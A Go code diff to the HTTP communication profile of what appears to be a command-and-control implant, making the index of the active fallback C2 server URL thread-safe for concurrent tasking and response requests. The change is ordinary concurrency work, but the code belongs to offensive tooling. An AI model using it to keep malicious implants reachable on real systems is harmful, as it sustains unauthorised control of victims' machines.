@@ -19,6 +19,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync/atomic"
 	"time"
 
 	"github.com/andybalholm/brotli"
@@ -70,7 +71,9 @@ type HTTPProfile struct {
 	FallbackURLs []string
 	// activeURLIdx tracks which URL in the list is currently being used.
 	// 0 = primary (BaseURL), 1+ = fallback URLs. Updated on failover.
-	activeURLIdx int
+	// Accessed atomically — makeRequest may be called concurrently from
+	// multiple PostResponse goroutines and the GetTasking loop.
+	activeURLIdx atomic.Int32
 
 	// Config vault — encrypted storage for sensitive C2 fields.
 	// When active, the struct fields above are zeroed and all access
@@ -817,10 +820,11 @@ func (h *HTTPProfile) allURLs(cfg *sensitiveConfig) []string {
 	urls = append(urls, fallbacks...)
 
 	// Rotate so the currently active URL is first
-	if h.activeURLIdx > 0 && h.activeURLIdx < len(urls) {
+	idx := int(h.activeURLIdx.Load())
+	if idx > 0 && idx < len(urls) {
 		rotated := make([]string, len(urls))
-		copy(rotated, urls[h.activeURLIdx:])
-		copy(rotated[len(urls)-h.activeURLIdx:], urls[:h.activeURLIdx])
+		copy(rotated, urls[idx:])
+		copy(rotated[len(urls)-idx:], urls[:idx])
 		return rotated
 	}
 	return urls
@@ -844,7 +848,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 	}
 
 	// Get all URLs in failover order (rotated so active URL is first)
-	originalIdx := h.activeURLIdx
+	originalIdx := int(h.activeURLIdx.Load())
 	urls := h.allURLs(cfg)
 	var lastErr error
 
@@ -910,7 +914,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 		// Success — remember which URL worked for next time
 		newIdx := (originalIdx + i) % len(urls)
 		if newIdx != originalIdx {
-			h.activeURLIdx = newIdx
+			h.activeURLIdx.Store(int32(newIdx))
 			log.Printf("[INFO] C2 failover: now using %s", baseURL)
 		}
 		return resp, nil
